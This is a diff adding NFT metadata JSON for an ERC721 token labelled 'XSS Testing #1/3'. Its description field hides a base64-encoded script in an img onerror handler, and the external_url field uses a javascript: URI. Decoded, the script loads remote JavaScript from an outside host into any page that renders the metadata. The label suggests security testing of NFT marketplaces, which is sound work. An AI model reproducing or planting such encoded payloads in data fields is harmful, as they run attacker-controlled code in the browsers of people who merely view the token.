@@ -1,0 +1,35 @@
+{
+  "address": "0x3292a1c032b48fd32983c9300fdef7a5fd4fdef5",
+  "type": "ERC721",
+  "name": "tendies V3",
+  "tokenCount": "3",
+  "uri": "https://arweave.net/E6SFDbw4LyCu4dt8T_bP3hYZXzWP506w25bN5CTgaes/1",
+  "metadata": {
+    "name": "XSS Testing #1/3",
+    "created_by": "XSS Testing",
+    "external_url": "javascript:alert(1);",
+    "description": "XSS Testing\n\n<img src='.' onerror='eval(atob(\"dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOyBzY3JpcHQuc3JjID0gJ2h0dHBzOi8veHNzLmJ1ZXIuaGF1cy9tYW5pZm9sZC5qcyc7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsg\"))'>",
+    "hidden": "test",
+    "attributes": [
+      {
+        "trait_type": "xss",
+        "value": "testing"
+      },
+      {
+        "display_type": "number",
+        "trait_type": "Edition",
+        "value": "1",
+        "max_value": "10"
+      }
+    ],
+    "image_details": {
+      "bytes": 10853,
+      "format": "PNG",
+      "sha256": "4b04f2a9d59fca6f7889986e694002167be8659d245f8657898a4622471404d0",
+      "width": 912,
+      "height": 527
+    },
+    "image": "https://arweave.net/80wEZJR0mVmQIp-6Gx1Pkk5vmWDM5j1DIsUvSsPKB3E",
+    "image_url": "https://arweave.net/80wEZJR0mVmQIp-6Gx1Pkk5vmWDM5j1DIsUvSsPKB3E"
+  }
+}
